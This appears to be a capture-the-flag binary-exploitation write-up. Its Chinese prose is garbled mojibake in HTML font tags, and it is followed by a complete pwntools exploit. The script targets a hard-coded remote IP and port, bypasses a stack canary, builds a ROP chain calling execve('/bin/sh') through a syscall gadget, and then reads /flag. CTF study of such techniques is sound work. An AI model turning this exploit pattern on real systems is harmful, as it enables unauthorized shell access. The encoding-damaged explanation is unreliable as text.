<font style="background-color:rgba(255, 255, 255, 0);">é€‰æ‰‹éœ€è¦å¯¹æ ˆä¸ŠçŸ¥è¯†ç‚¹è¿›è¡Œç»¼åˆåˆ©ç”¨ã€‚ç”±äº</font>`<font style="background-color:rgba(255, 255, 255, 0);">canary</font>`<font style="background-color:rgba(255, 255, 255, 0);">ä¿æŠ¤å¼€å¯ï¼Œä¸”æœ€åç¬¬ä¸‰å…³ä¸€å®šä¸ºæ ˆæº¢å‡ºï¼Œåˆ™é€‰æ‰‹éœ€è¦æ€è€ƒå¦‚ä¸‹å†…å®¹ï¼š</font>

+ `<font style="background-color:rgba(255, 255, 255, 0);">canary</font>`<font style="background-color:rgba(255, 255, 255, 0);"> </font><font style="background-color:rgba(255, 255, 255, 0);">çš„ç»•è¿‡æ–¹æ³•</font>
+ `<font style="background-color:rgba(255, 255, 255, 0);">gadget</font>`<font style="background-color:rgba(255, 255, 255, 0);"> </font><font style="background-color:rgba(255, 255, 255, 0);">çš„å¯»æ‰¾</font>

<font style="background-color:rgba(255, 255, 255, 0);">é€šè¿‡å¦‚ä¸Šæ€è€ƒï¼Œå¯çŸ¥ç¬¬ä¸€å…³ä¸€å®šé€‰æ‹©</font>`<font style="background-color:rgba(255, 255, 255, 0);">tls</font>`<font style="background-color:rgba(255, 255, 255, 0);">çš„</font>`<font style="background-color:rgba(255, 255, 255, 0);">canary</font>`<font style="background-color:rgba(255, 255, 255, 0);">ç½®é›¶ï¼ˆä¸ç„¶æ²¡æœ‰åˆ«çš„åŠæ³•æ ˆæº¢å‡ºï¼‰ï¼›ç¬¬äºŒå…³ä¸€å®šé€‰æ‹©</font>`<font style="background-color:rgba(255, 255, 255, 0);">alarm</font>`<font style="background-color:rgba(255, 255, 255, 0);">çš„</font>`<font style="background-color:rgba(255, 255, 255, 0);">got</font>`<font style="background-color:rgba(255, 255, 255, 0);">è¡¨</font>`<font style="background-color:rgba(255, 255, 255, 0);">+5</font>`<font style="background-color:rgba(255, 255, 255, 0);">ï¼Œä»è€Œè·å¾—</font>`<font style="background-color:rgba(255, 255, 255, 0);">syscall</font>`<font style="background-color:rgba(255, 255, 255, 0);">çš„</font>`<font style="background-color:rgba(255, 255, 255, 0);">gadget</font>`<font style="background-color:rgba(255, 255, 255, 0);">ï¼›ç¬¬ä¸‰å…³ä¸€å®šé€‰æ‹©ä¸¤æ¬¡</font>`<font style="background-color:rgba(255, 255, 255, 0);">read</font>`<font style="background-color:rgba(255, 255, 255, 0);">çš„</font>`<font style="background-color:rgba(255, 255, 255, 0);">off-by-null</font>`<font style="background-color:rgba(255, 255, 255, 0);">çš„æ ˆæº¢å‡ºï¼Œä»è€Œèƒ½å¤Ÿæ§åˆ¶</font>`<font style="background-color:rgba(255, 255, 255, 0);">rax</font>`<font style="background-color:rgba(255, 255, 255, 0);">ã€‚</font>

<font style="background-color:rgba(255, 255, 255, 0);">æœ€åï¼Œé€‰æ‰‹åº”è¯¥é€šè¿‡å¦‚ä¸‹æ–¹å¼å®Œæˆç³»ç»Ÿè°ƒç”¨ï¼š</font>

+ `<font style="background-color:rgba(255, 255, 255, 0);">rax</font>`<font style="background-color:rgba(255, 255, 255, 0);">ï¼šé€šè¿‡</font>`<font style="background-color:rgba(255, 255, 255, 0);">read</font>`<font style="background-color:rgba(255, 255, 255, 0);">æ§åˆ¶</font>
+ `<font style="background-color:rgba(255, 255, 255, 0);">rdi</font>`<font style="background-color:rgba(255, 255, 255, 0);">ï¼šé€šè¿‡ç¨‹åº</font>`<font style="background-color:rgba(255, 255, 255, 0);">gadget</font>`<font style="background-color:rgba(255, 255, 255, 0);">çš„</font>`<font style="background-color:rgba(255, 255, 255, 0);">pop rdi; ret</font>`<font style="background-color:rgba(255, 255, 255, 0);">è·å¾—</font>
+ `<font style="background-color:rgba(255, 255, 255, 0);">rsi</font>`<font style="background-color:rgba(255, 255, 255, 0);">ï¼šåŒä¸Š</font>
+ `<font style="background-color:rgba(255, 255, 255, 0);">rdx</font>`<font style="background-color:rgba(255, 255, 255, 0);">ï¼šåŒä¸Š</font>
+ `<font style="background-color:rgba(255, 255, 255, 0);">syscall</font>`<font style="background-color:rgba(255, 255, 255, 0);">ï¼šé€šè¿‡</font>`<font style="background-color:rgba(255, 255, 255, 0);">alarm+5</font>`<font style="background-color:rgba(255, 255, 255, 0);">è·å¾—</font>
+ `<font style="background-color:rgba(255, 255, 255, 0);">/bin/sh</font>`<font style="background-color:rgba(255, 255, 255, 0);">ï¼šé€šè¿‡ç¨‹åºå†…å­—ç¬¦ä¸²çš„åç§»è·å¾—</font>

<font style="background-color:rgba(255, 255, 255, 0);">æœ€ç»ˆçš„</font>`<font style="background-color:rgba(255, 255, 255, 0);">exp</font>`<font style="background-color:rgba(255, 255, 255, 0);">å¦‚ä¸‹ï¼š</font>

```python
from pwn import *

filename = './attachment'
context.arch='amd64'
context.log_level = "debug"
context.terminal = ['tmux', 'neww']
local = 0
all_logs = []
# elf = ELF(filename)
# libc = elf.libc

if local:
    sh = process(filename)
else:
    sh = remote('101.200.198.105', 20689)

def debug(params=''):
    for an_log in all_logs:
        success(an_log)
    pid = util.proc.pidof(sh)[0]
    gdb.attach(pid, params)

def leak_info(name, addr):
    output_log = '{} => {}'.format(name, hex(addr))
    all_logs.append(output_log)
    success(output_log)

def weapon(index):
    sh.sendafter('> ', '1')
    time.sleep(1)
    sh.sendafter('To achive your, your DrEaMğŸ¥¹..!?\n', str(index))
    time.sleep(1)

def bless(count, addr):
    sh.sendafter('> ', '2')
    time.sleep(1)
    sh.sendafter('> ', str(count))
    time.sleep(1)
    sh.sendafter('> ', str(addr))
    time.sleep(1)

def challenge(content1, content2):
    sh.sendafter('> ', '3')
    time.sleep(1)
    sh.send(content1)
    time.sleep(1)
    sh.send(content2)
    time.sleep(1)

ret = 0x04007fe
pop_rdi = 0x4013f4
pop_rsi = 0x4013f6
pop_rdx = 0x4013f8
pop_rsp = 0x4013fa
bin_sh = 0x4019D7
syscall = 0x602058

weapon(-0x2b18)
bless('5', syscall)

payload1 = p64(ret)*0x16
rop_chain = p64(pop_rdi) + p64(bin_sh)
rop_chain += p64(pop_rsi) + p64(0)
rop_chain += p64(pop_rdx) + p64(0)
rop_chain += p64(pop_rsp) + p64(syscall)

payload1 = payload1 + rop_chain
payload1 = payload1.ljust(0x100, b'\x00')

payload2 = b'a'*0x3b
challenge(payload1, payload2)

sh.sendline('exec 1>& 0')
time.sleep(1)
sh.sendline('cat /flag')
sh.interactive()
```

